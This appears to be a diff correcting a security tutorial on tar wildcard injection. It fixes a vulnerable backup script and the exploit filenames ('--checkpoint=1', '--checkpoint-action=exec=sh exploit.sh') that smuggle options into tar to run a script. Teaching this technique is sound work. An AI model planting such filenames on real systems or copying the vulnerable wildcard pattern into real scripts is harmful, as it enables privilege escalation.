@@ -16,7 +16,7 @@ Imagine a scenario where a script backups a directory \(that we can control\) on
 #!/bin/bash
 
 mkdir -p /backups/
-tar cvzf /backups/backup_$(date +%Y_%m_%d_%Hh%M).tar.gz /var/www/html/*
+cd /var/www/html/ && tar cvzf /backups/backup_$(date +%Y_%m_%d_%Hh%M).tar.gz *
 ```
 
 Notice this interesting pattern `tar czvf file.tar.gz *` in the script. This is a security vulnerability because of how UNIX shells handles wildcards. Let's see an example with the `ls` command :
@@ -57,7 +57,7 @@ To use these options in our exploit, we jut need to create these two files in ou
 
 ```text
 echo '' > '--checkpoint=1'
-echo '' > '--checkpoint-action=sh exploit.sh'
+echo '' > '--checkpoint-action=exec=sh exploit.sh'
 
 $ ls -lha 
 total 88K
@@ -66,7 +66,7 @@ drwxrwxrwt 89 user user  76K avril 27 22:31 ..
 -rw-rw-r--  1 user user    0 avril 27 22:31 file1
 -rw-rw-r--  1 user user    0 avril 27 22:31 file2
 -rw-rw-r--  1 user user    1 avril 27 22:31 '--checkpoint=1'
--rw-rw-r--  1 user user    1 avril 27 22:32 '--checkpoint-action=sh exploit.sh'
+-rw-rw-r--  1 user user    1 avril 27 22:32 '--checkpoint-action=exec=sh exploit.sh'
 -rwxrwxrwx  1 user user  784 avril 27 22:32 exploit.sh
 ```
 
